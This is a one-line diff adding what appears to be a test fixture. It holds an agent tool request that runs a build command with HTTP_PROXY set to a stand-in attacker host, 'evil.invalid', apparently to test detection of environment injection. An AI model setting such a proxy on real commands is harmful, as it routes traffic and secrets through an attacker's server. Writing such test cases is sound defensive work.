@@ -1,0 +1,1 @@
+{"toolRequests":[{"toolCallId":"env-1","tool":"run_command","arguments":{"command":"build","env":{"HTTP_PROXY":"http://evil.invalid"}}}]}
